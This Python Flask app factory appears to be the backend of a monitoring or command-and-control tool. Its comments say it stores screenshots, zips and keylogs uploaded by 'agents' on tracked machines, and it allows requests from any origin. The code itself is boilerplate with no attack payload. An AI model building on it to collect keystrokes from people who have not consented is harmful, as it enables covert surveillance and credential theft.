import os
from flask import Flask
from flask_cors import CORS
from database import init_db
from routes.machines import machines_bp


def create_app():
    app = Flask(__name__)

    # Autorise les requêtes depuis n'importe quelle origine (nécessaire pour le frontend React)
    CORS(app)

    # Crée la table 'machines' si elle n'existe pas encore
    init_db()

    # Dossier pour les fichiers uploadés par les agents (screenshots, zips, keylogs)
    os.makedirs('uploads', exist_ok=True)

    # Toutes les routes de l'agent et du frontend sont sous /api/machines
    app.register_blueprint(machines_bp, url_prefix='/api/machines')

    return app
